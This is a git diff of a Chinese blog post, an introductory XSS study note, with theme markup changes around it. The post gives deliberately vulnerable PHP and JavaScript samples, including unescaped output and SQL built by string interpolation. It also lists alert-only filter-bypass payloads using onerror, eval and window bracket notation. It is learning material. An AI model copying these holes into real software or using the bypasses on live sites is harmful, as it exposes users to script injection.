@@ -1,179 +1,233 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <meta name="theme-color" content="#3367D6"/>
-  <link rel="apple-touch-icon" href="/icons-192.png">
-  <link rel="manifest" href="/manifest.json">
-  
-  <meta name="generator" content="Hexo 7.1.1">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS | 秋红庭</title><meta name="author" content="pax"><meta name="copyright" content="pax"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSS学习推荐文章：对于XSS跨站脚本攻击的学习 - 先知社区 (aliyun.com) 原理文章：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12890?time__1311&#x3D;mqmhq%2BxjhiGKDsD7GY0%3DbDtRhbpWiYeD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com.hk%2F 概述概念跨站脚本攻击（Cross-Site">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="http://example.com/2024/03/18/XSS/index.html">
+<meta property="og:site_name" content="秋红庭">
+<meta property="og:description" content="XSS学习推荐文章：对于XSS跨站脚本攻击的学习 - 先知社区 (aliyun.com) 原理文章：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12890?time__1311&#x3D;mqmhq%2BxjhiGKDsD7GY0%3DbDtRhbpWiYeD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com.hk%2F 概述概念跨站脚本攻击（Cross-Site">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/photo/77.jpg">
+<meta property="article:published_time" content="2024-03-18T15:02:40.000Z">
+<meta property="article:modified_time" content="2024-03-18T23:38:58.963Z">
+<meta property="article:author" content="pax">
+<meta property="article:tag" content="入门">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/photo/77.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/03/18/XSS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
 
-  
-    <meta name="description" content="Pax is a handsome">
-  
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
 
-  
-    <meta name="keywords" content="handsome">
-  
+          document.head.appendChild(script)
+        }),
 
-  
-    <meta name="author" content="pax">
-  
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
 
-  
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
 
-  
-
-  <title>XSS | 布衣远游，心有所归</title>
-
-  
-
-  
-    <link rel="shortcut icon" href="/favicon.ico">
-  
-
-  <!--mathjax latex数学公式显示支持-->
-  
-  
-
-  
-
-  
-
-  
-<link rel="stylesheet" href="/css/style.css">
-
-</head>
-<body>
-  <div class="root-container">
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
     
-<!-- header container -->
-<header class="header-container post">
-  
-    <div class="post-image" style="background-image: url(./photo/77.jpg)"></div>
-  
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
 
-  <!-- navbar -->
-<nav class="navbar">
-  <div class="navbar-content">
-    <!-- logo -->
-    <div class="navbar-logo">
-      <a href="/">
-        
-          布衣远游，心有所归
-        
-      </a>
-    </div>
-    <!-- link -->
-    <div class="navbar-link">
-      <div class="navbar-btn">
-        <div></div>
-        <div></div>
-        <div></div>
-      </div>
-      <ul class="navbar-list">
-        
-          <li class="navbar-list-item"><a href="/">首页</a></li>
-        
-          <li class="navbar-list-item"><a href="/links">友链</a></li>
-        
-          <li class="navbar-list-item"><a href="/about">关于</a></li>
-        
-          <li class="navbar-list-item"><a href="/poem">诗集</a></li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-    <div class="header-content">
-      <div class="post-text layout-block">
-        <div class="layout-margin">
-          <h1 class="title-wrap">XSS</h1>
-          <h2 class="title-sub-wrap">
-            <strong>pax</strong>
-            <span>发布于</span>
-            <time  class="article-date" datetime="2024-03-18T15:02:40.000Z" itemprop="datePublished">2024-03-18</time>
-          </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-03-18T23:38:58.963Z" itemprop="dateUpdated">2024-03-19</time>
-            </h2>
-          
-          
-            <h2 id="/2024/03/18/XSS/" class="title-sub-wrap leancloud_visitors" data-flag-title="XSS">
-              <em>文章访问量</em>
-              <i class="leancloud-visitors-count"></i>
-            </h2>
-          
-          <ul class="wrap-list dark">
-  
-</ul>
-          <ul class="wrap-list dark">
-  
-    <li><a href="/tags/%E5%85%A5%E9%97%A8/">🏷️ 入门</a></li>
-  
-</ul>
-        </div>
-      </div>
-    </div>
-  
-
-  
-  
-  
-</header>
-
-    <!-- 文章 -->
-
-<!-- 文章内容 -->
-<div class="body-container">
-  <article class="content-container layout-block post-container">
-    <div class="article-info">
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
       
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
       
-      
-      
-      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><strong>推荐文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12370?time__1311=mqmhD57KAIe+OxBqDTnxUOznD88evwPx&alichlgref=https://xz.aliyun.com/t/12370#tdsub">对于XSS跨站脚本攻击的学习 - 先知社区 (aliyun.com)</a></strong></p>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-19 07:38:58'
+}</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 中庭</span></a></div><div class="menus_item"><a class="site-page" href="/poem/"><i class="fa-fw fas fa-poem"></i><span> 诗壁</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博客</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/77.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="秋红庭"><span class="site-name">秋红庭</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 中庭</span></a></div><div class="menus_item"><a class="site-page" href="/poem/"><i class="fa-fw fas fa-poem"></i><span> 诗壁</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博客</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-18T15:02:40.000Z" title="发表于 2024-03-18 23:02:40">2024-03-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-18T23:38:58.963Z" title="更新于 2024-03-19 07:38:58">2024-03-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><strong>推荐文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12370?time__1311=mqmhD57KAIe+OxBqDTnxUOznD88evwPx&alichlgref=https://xz.aliyun.com/t/12370#tdsub">对于XSS跨站脚本攻击的学习 - 先知社区 (aliyun.com)</a></strong></p>
 <p>原理文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12890?time__1311=mqmhq+xjhiGKDsD7GY0=bDtRhbpWiYeD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/12890?time__1311=mqmhq%2BxjhiGKDsD7GY0%3DbDtRhbpWiYeD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p>
-<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的Web安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。这种攻击通常利用Web应用程序没有对用户输入的数据进行足够的过滤和验证。</span><br></pre></td></tr></table></figure>
+<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><pre><code class="highlight plaintext">跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的Web安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。这种攻击通常利用Web应用程序没有对用户输入的数据进行足够的过滤和验证。</code></pre>
 
-<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XSS跨站脚本攻击的原理是利用Web应用程序对用户输入数据的不足过滤和验证，将恶意脚本注入到受害者的浏览器中，使其在浏览器中执行。</span><br><span class="line">攻击者通常会将恶意脚本嵌入到Web页面中的某个位置，比如输入框、评论框、搜索框等等，然后诱使用户访问这个被注入了恶意脚本的页面。当用户访问页面时，恶意脚本就会在用户的浏览器中被执行，从而执行攻击者预先设定好的恶意行为，比如窃取用户的Cookie信息、伪造用户的网站行为等等。</span><br></pre></td></tr></table></figure>
+<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><pre><code class="highlight plaintext">XSS跨站脚本攻击的原理是利用Web应用程序对用户输入数据的不足过滤和验证，将恶意脚本注入到受害者的浏览器中，使其在浏览器中执行。
+攻击者通常会将恶意脚本嵌入到Web页面中的某个位置，比如输入框、评论框、搜索框等等，然后诱使用户访问这个被注入了恶意脚本的页面。当用户访问页面时，恶意脚本就会在用户的浏览器中被执行，从而执行攻击者预先设定好的恶意行为，比如窃取用户的Cookie信息、伪造用户的网站行为等等。</code></pre>
 
 <h4 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h4><h5 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h5><p>将代码传输到后端进而到数据库进行储存，再特定情况下实现代码功能。</p>
 <p>示例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">    &lt;p&gt;请输入您的评论：&lt;/p&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 处理评论表单的提交</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>];</span><br><span class="line">      <span class="comment">// 将评论存储到数据库中</span></span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO comments (content) VALUES (&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">  &lt;h2&gt;评论区&lt;/h2&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="comment">// 显示所有评论</span></span><br><span class="line">      <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM comments&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>] . <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="highlight php">&lt;form&gt;
+    &lt;p&gt;请输入您的评论：&lt;/p&gt;
+    &lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;
+    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;
+  &lt;/form&gt;
+  <span class="meta">&lt;?php</span>
+    <span class="comment">// 处理评论表单的提交</span>
+    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;
+      <span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>];
+      <span class="comment">// 将评论存储到数据库中</span>
+      <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO comments (content) VALUES (&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;
+      <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);
+    &#125;
+  <span class="meta">?&gt;</span>
+  &lt;h2&gt;评论区&lt;/h2&gt;
+  &lt;ul&gt;
+    <span class="meta">&lt;?php</span>
+      <span class="comment">// 显示所有评论</span>
+      <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM comments&quot;</span>);
+      <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;
+        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>] . <span class="string">&quot;&lt;/li&gt;&quot;</span>;
+      &#125;
+    <span class="meta">?&gt;</span></code></pre>
 
 <h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><blockquote>
 <p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
 <p>一般就是题目给一个<code>&lt;input&gt;</code>标签形成的输入框，然后我们在输入框里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示，这也就是反射型XSS的数据流通。</p>
 </blockquote>
 <p>示例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">   &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"> &lt;p&gt;您好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="meta">?&gt;</span>！&lt;/p&gt; </span><br></pre></td></tr></table></figure>
+<pre><code class="highlight php">&lt;form&gt;
+   &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;
+   &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;
+ &lt;/form&gt;
+ &lt;p&gt;您好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="meta">?&gt;</span>！&lt;/p&gt;</code></pre>
 
 <h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><blockquote>
 <p>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
 <p>这种XSS攻击是不经过后端的，它也算是一种反射型XSS，但是它的数据流通过程比较简单，就是在前端url添加我们的恶意脚本，然后直接在页面输出了</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   var query = window.location.search.substring(1);</span><br><span class="line">   var name = query.split(&quot;=&quot;)[1];</span><br><span class="line">   document.write(&quot;&lt;p&gt;Hello, &quot; + name + &quot;!&lt;/p&gt;&quot;);</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;
+   var query = window.location.search.substring(1);
+   var name = query.split(&quot;=&quot;)[1];
+   document.write(&quot;&lt;p&gt;Hello, &quot; + name + &quot;!&lt;/p&gt;&quot;);
+ &lt;/script&gt;</code></pre>
 
 <h5 id="JSONP-XSS"><a href="#JSONP-XSS" class="headerlink" title="JSONP XSS"></a>JSONP XSS</h5><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/tiancityycf/article/details/117675042">jsonp安全攻防技术（JSON劫持、XSS漏洞）_xss漏洞 json-CSDN博客</a></p>
 <h3 id="XSS攻击点-插入点"><a href="#XSS攻击点-插入点" class="headerlink" title="XSS攻击点(插入点)"></a>XSS攻击点(插入点)</h3><h4 id="插入到HTML注释内容中"><a href="#插入到HTML注释内容中" class="headerlink" title="插入到HTML注释内容中"></a>插入到HTML注释内容中</h4><p>没见过，见过再补。</p>
@@ -182,11 +236,14 @@
 <h4 id="插入到HTML标签属性名中"><a href="#插入到HTML标签属性名中" class="headerlink" title="插入到HTML标签属性名中"></a>插入到HTML标签属性名中</h4><p>没见过，见过再补。</p>
 <h4 id="插入到HTML标签名中"><a href="#插入到HTML标签名中" class="headerlink" title="插入到HTML标签名中"></a>插入到HTML标签名中</h4><p>没见过，见过再补。</p>
 <h4 id="插入到CSS中"><a href="#插入到CSS中" class="headerlink" title="插入到CSS中"></a>插入到CSS中</h4><p>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`Evi1s7`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`Evi1s7`)&#x27;);&quot;&gt;</code></pre>
 
 <h4 id="插入到HTTP响应中"><a href="#插入到HTTP响应中" class="headerlink" title="插入到HTTP响应中"></a>插入到HTTP响应中</h4><p>没见过，见过再补。</p>
 <h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>示例(原理是第一点)：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="variable">$q</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="variable">$q</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$q</span>); </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+      <span class="variable">$q</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;
+      <span class="variable">$q</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$q</span>); 
+    <span class="meta">?&gt;</span></code></pre>
 
 <blockquote>
 <p>以下是一些可能导致大小写绕过的情况和原理：</p>
@@ -216,9 +273,9 @@
 <p><code>var x = 10;</code><br><code>var y = 20;</code><br><code>var codeString = &quot;x + y&quot;;</code><br><code>var result = eval(codeString);</code><br><code>console.log(result); // 输出 30</code></p>
 <p>把eval的参数字符串当成运行代码即可</p>
 <p>绕过示例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;</code></pre>
 
-<h6 id="window"><a href="#window" class="headerlink" title="window"></a>window</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h6 id="window"><a href="#window" class="headerlink" title="window"></a>window</h6><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</code></pre>
 
 <blockquote>
 <p>这段代码中 <code>window[&#39;alert&#39;](1)</code> 是使用 JavaScript 中的数组标记法（Array Bracket Notation）来调用 <code>window</code> 对象的 <code>alert</code> 方法。</p>
@@ -226,27 +283,47 @@
